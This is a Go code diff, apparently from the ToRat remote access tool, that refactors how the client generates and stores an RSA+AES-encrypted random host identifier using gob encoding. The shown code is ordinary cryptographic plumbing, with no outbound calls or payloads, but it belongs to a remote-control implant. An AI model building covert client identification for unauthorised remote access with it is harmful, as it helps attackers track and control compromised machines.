@@ -6,24 +6,14 @@ import (
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
-	"crypto/x509"
-	"encoding/pem"
+	"encoding/gob"
 	"io"
-	"io/ioutil"
 	"log"
 	mathrand "math/rand"
-)
+	"os"
 
-// CertToPubKey convert a X509 PEM encoded certicate to RSA PublicKey
-func CertToPubKey(certPEM string) (*rsa.PublicKey, error) {
-	block, _ := pem.Decode([]byte(certPEM))
-	cert, err := x509.ParseCertificate(block.Bytes)
-	if err != nil {
-		return nil, err
-	}
-	rsaPublicKey := cert.PublicKey.(*rsa.PublicKey)
-	return rsaPublicKey, nil
-}
+	"github.com/lu4p/ToRat/models"
+)
 
 // GenRandString generate a random string
 func GenRandString() string {
@@ -36,29 +26,25 @@ func GenRandString() string {
 	return string(b)
 }
 
-// SetHostname Sets the Hostname of the machine to a
-// random string with the length of 16, encrypts the outcome and
-// writes it to Disk
-func SetHostname(path string, PubKey *rsa.PublicKey) error {
+// genHostname generates the Hostname of the machine
+func genHostname(PubKey *rsa.PublicKey) models.EncAsym {
 	hostname := GenRandString()
-	return EnctoFile([]byte(hostname), path, PubKey)
+	return encAsym([]byte(hostname), PubKey)
 }
 
 // GetHostname returns the encrypted Hostname
 // if Hostname is not set a new Hostname is generated
-func GetHostname(path string, PubKey *rsa.PublicKey) []byte {
-	encHostname, err := ioutil.ReadFile(path)
-	if err != nil {
-		if SetHostname(path, PubKey) == nil {
-			encHostname, err = ioutil.ReadFile(path)
-			if err != nil {
-				return nil
-			}
-			return encHostname
-		}
-		return nil
+func GetHostname(path string, PubKey *rsa.PublicKey) models.EncAsym {
+	encAsym, err := getEncodedFile(path)
+	if err == nil {
+		return encAsym
 	}
-	return encHostname
+
+	hostname := genHostname(PubKey)
+
+	encodeToFile(hostname, path)
+
+	return hostname
 }
 
 func encRsa(data []byte, RsaPublicKey *rsa.PublicKey) []byte {
@@ -71,53 +57,70 @@ func encRsa(data []byte, RsaPublicKey *rsa.PublicKey) []byte {
 	return ciphertext
 }
 
-// EnctoFile encrypts data using RSA + AES to the publickey
-// of the server and writes the encrypted data to disk
-func EnctoFile(data []byte, path string, PubKey *rsa.PublicKey) error {
-	aeskey, err := genAesKey()
+func getEncodedFile(path string) (models.EncAsym, error) {
+	f, err := os.Open(path)
 	if err != nil {
-		return err
+		return models.EncAsym{}, err
 	}
-	encKey := encRsa(aeskey, PubKey)
-	encData, err := encAes(data, aeskey)
-	if err != nil {
-		return err
-	}
-	enc := append(encKey, encData...)
-	err = ioutil.WriteFile(path, enc, 0666)
-	if err != nil {
-		return err
-	}
-	return nil
+	defer f.Close()
 
+	decoder := gob.NewDecoder(f)
+	var encAsym models.EncAsym
+	decoder.Decode(&encAsym)
+	return encAsym, nil
+}
+
+// encAsym encrypts data using RSA + AES to the publickey
+// of the server
+func encAsym(data []byte, pubKey *rsa.PublicKey) models.EncAsym {
+	aeskey := genAesKey()
+	encKey := encRsa(aeskey, pubKey)
+	encData := encAes(data, aeskey)
+	return models.EncAsym{
+		EncAesKey: encKey,
+		EncData:   encData,
+	}
+}
+
+// encodeToFile encodes data using gob and writes the result to path
+func encodeToFile(data models.EncAsym, path string) error {
+	f, err := os.Create(path)
+	if err != nil {
+		return err
+	}
+
+	defer f.Close()
+
+	encoder := gob.NewEncoder(f)
+	return encoder.Encode(&data)
 }
 
 // genAesKey generates a 256bit AES Key
-func genAesKey() ([]byte, error) {
-	AesKey := make([]byte, 32)
-	_, err := rand.Read(AesKey)
+func genAesKey() []byte {
+	key := make([]byte, 32)
+	_, err := rand.Read(key)
 	if err != nil {
-		return nil, err
+		log.Fatal("Fatal:", err)
 	}
-	return AesKey, nil
+	return key
 }
 
-func encAes(data []byte, AesKey []byte) ([]byte, error) {
-	block, err := aes.NewCipher(AesKey)
+func encAes(data []byte, aesKey []byte) []byte {
+	block, err := aes.NewCipher(aesKey)
 	if err != nil {
-		return nil, err
+		log.Fatal("Fatal:", err)
 	}
 	nonce := make([]byte, 12)
 	_, err = io.ReadFull(rand.Reader, nonce)
 	if err != nil {
-		return nil, err
+		log.Fatal("Fatal:", err)
 	}
 	aesgcm, err := cipher.NewGCM(block)
 	if err != nil {
-		return nil, err
+		log.Fatal("Fatal:", err)
 	}
 
 	ciphertext := aesgcm.Seal(nil, nonce, data, nil)
 	encData := append(nonce, ciphertext...)
-	return encData, nil
+	return encData
 }
